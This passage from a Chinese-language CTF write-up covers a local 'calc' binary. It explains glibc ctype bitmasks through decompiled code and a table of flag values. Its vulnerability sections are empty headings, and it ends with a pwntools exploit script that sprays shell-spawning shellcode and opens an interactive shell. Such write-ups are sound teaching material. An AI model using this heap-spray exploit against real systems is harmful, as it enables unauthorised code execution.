{
  const unsigned __int16 **v3; // rax
  const unsigned __int16 **v4; // rax
  const unsigned __int16 **v5; // rax
  const unsigned __int16 **v6; // rax
  const unsigned __int16 **v7; // rax
  const unsigned __int16 **v8; // rax
  const unsigned __int16 **v9; // rax
  const unsigned __int16 **v10; // rax
  const unsigned __int16 **v11; // rax
  const unsigned __int16 **v12; // rax
  const unsigned __int16 **v13; // rax
  const unsigned __int16 **v14; // rax

  v3 = __ctype_b_loc();
  printf("isalnum %d\n", (*v3)[s] & 8);
  v4 = __ctype_b_loc();
  printf("isalpha %d\n", (*v4)[s] & 0x400);
  v5 = __ctype_b_loc();
  printf("iscntrl %d\n", (*v5)[s] & 2);
  v6 = __ctype_b_loc();
  printf("isdigit %d\n", (*v6)[s] & 0x800);
  v7 = __ctype_b_loc();
  printf("isgraph %d\n", (*v7)[s] & 0x8000);
  v8 = __ctype_b_loc();
  printf("islower %d\n", (*v8)[s] & 0x200);
  v9 = __ctype_b_loc();
  printf("isprint %d\n", (*v9)[s] & 0x4000);
  v10 = __ctype_b_loc();
  printf("ispunct %d\n", (*v10)[s] & 4);
  v11 = __ctype_b_loc();
  printf("isspace %d\n", (*v11)[s] & 0x2000);
  v12 = __ctype_b_loc();
  printf("isupper %d\n", (*v12)[s] & 0x100);
  v13 = __ctype_b_loc();
  printf("isxdigit %d\n", (*v13)[s] & 0x1000);
  v14 = __ctype_b_loc();
  printf("isblank %d\n", (*v14)[s] & 1);
  return 0;
}

```

所以本题的`(*__ctype_b_loc())[*s1] & 0x800`其实就是`isdigit(s1)`，判断一下拆分出来的字符是不是数字的字符。故整理表格如下，可以看出要注意flag存储是小端两个字节：

| function | flag   | source                                                       |
| -------- | ------ | ------------------------------------------------------------ |
| isblank  | 0x0001 | _ISblank  = _ISbit   (8),        /*   Blank (usually SPC and TAB).  */ |
| iscntrl  | 0x0002 | _IScntrl  = _ISbit   (9),        /*   Control character.  */  |
| ispunct  | 0x0004 | _ISpunct  = _ISbit   (10),       /*   Punctuation.  */       |
| isalnum  | 0x0008 | _ISalnum  = _ISbit   (11),       /*   Alphanumeric.  */       |
| isupper  | 0x0100 | _ISupper  = _ISbit   (0),        /*   UPPERCASE.  */            |
| islower  | 0x0200 | _ISlower  = _ISbit   (1),        /*   lowercase.  */          |
| isalpha  | 0x0400 | _ISalpha  = _ISbit   (2),        /*   Alphabetic.  */         |
| isdigit  | 0x0800 | _ISdigit  = _ISbit   (3),        /*   Numeric.  */            |
| isxdigit | 0x1000 | _ISxdigit = _ISbit   (4),        /*   Hexadecimal numeric.  */ |
| isspace  | 0x2000 | _ISspace  = _ISbit   (5),        /*   Whitespace.  */         |
| isprint  | 0x4000 | _ISprint  = _ISbit   (6),        /*   Printing.  */           |
| isgraph  | 0x8000 | _ISgraph  = _ISbit   (7),        /*   Graphical.  */          |


## 漏洞点

### 整数溢出

### 堆溢出

## 利用

## 最终exp

```python
from pwn import *
context(arch="i386", os="linux")
elf = ELF("./calc")
io = process(elf.path)

payload = '"'+asm(shellcraft.sh()).rjust(200,"\x0c")+'" * 500'
for i in range(6000):
   io.sendlineafter("> ",payload)

io.sendline("1 "*33)
io.recvuntil(">")
io.interactive()
```